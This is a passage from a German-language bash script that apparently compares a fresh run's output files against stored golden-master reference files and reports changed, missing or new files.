    [[ -d "$REF_DIR" ]] || fail "Keine Referenz vorhanden — zuerst: werkzeuge/goldmuster.sh aufnehmen"
    lauf_ausfuehren "$BAUM" "$ABLAGE"
    NEU="${ARBEIT}/neu"; ausgabe_einsammeln "$ABLAGE" "$NEU"
    echo
    ABWEICHUNG=0
    for f in "$REF_DIR"/*; do
      n="$(basename "$f")"
      if [[ ! -f "${NEU}/${n}" ]]; then
        fail "Datei fehlt im neuen Lauf: ${n}"
      fi
      if diff -q "$f" "${NEU}/${n}" >/dev/null; then
        ok "${n} unveraendert"
      else
        ABWEICHUNG=1
        warn "${n} weicht ab:"
        diff -u "$f" "${NEU}/${n}" | sed -n '3,40p' | sed 's/^/     /'
      fi
    done
    for f in "$NEU"/*; do
      n="$(basename "$f")"
      [[ -f "${REF_DIR}/${n}" ]] || { ABWEICHUNG=1; warn "neue Datei ohne Referenz: ${n}"; }
    done
    echo
    if [[ $ABWEICHUNG -eq 0 ]]; then
      ok "Keine Abweichung zur Referenz."
      rm -rf "$ARBEIT"; exit 0
    fi
    warn "Abweichungen gefunden. Beabsichtigt? Dann Referenz neu aufnehmen."
    info "Vollstaendiger Vergleich: diff -ru ${REF_DIR} ${NEU}"
    exit 1 ;;

  *) fail "Unbekannte Aktion: ${AKTION} (aufnehmen | vergleichen | baum)" ;;
esac
